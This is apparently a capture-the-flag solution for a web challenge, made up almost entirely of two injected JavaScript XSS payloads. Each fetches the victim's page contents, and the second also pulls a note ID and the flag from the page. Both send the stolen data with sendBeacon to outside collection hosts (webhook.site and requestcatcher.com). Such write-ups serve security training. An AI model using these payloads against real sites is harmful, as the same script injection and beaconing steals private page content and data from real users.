# Solution

Leak first page:
```html
<script type="text/javascript">
    (async () => {
    const log = (msg) => navigator.sendBeacon('https://webhook.site/d42acc91-0830-4609-ac6e-7b26fe7c5af0/', msg);

    log("Loaded script")

    const res = await fetch("/");
    const text = await res.text();
    log(text)
})()
</script> 
```

Then use whatever assigned ID is returned and leak that page. Or do it in one request:
```html
<script type="text/javascript">
const extract = (content, key_start, key_end, include_keys) => {
    if(!content.includes(key_start) || !content.includes(key_end)){
        return undefined;
    }

    const value = content.split(key_start)[1].split(key_end)[0]
    return (include_keys !== false ? key_start + value + key_end : value)
}

(async () => {
    const log = (msg) => navigator.sendBeacon('https://testasdasd.requestcatcher.com/test', msg);

    log("Loaded script")

    const res = await fetch("/");
    const page_index = await res.text();
    
    log(page_index) // Logs all the page contents
    const note_id = extract(page_index, "/view.php?note=", '"', false)
    log(`Target note: ${note_id}`)

    const page_flag = await (await fetch("/view.php?note=" + note_id)).text()
    const flag = extract(page_flag, "CTF{", "}", true)
    log(`Flag: ${flag}`)
})()
</script> 
```
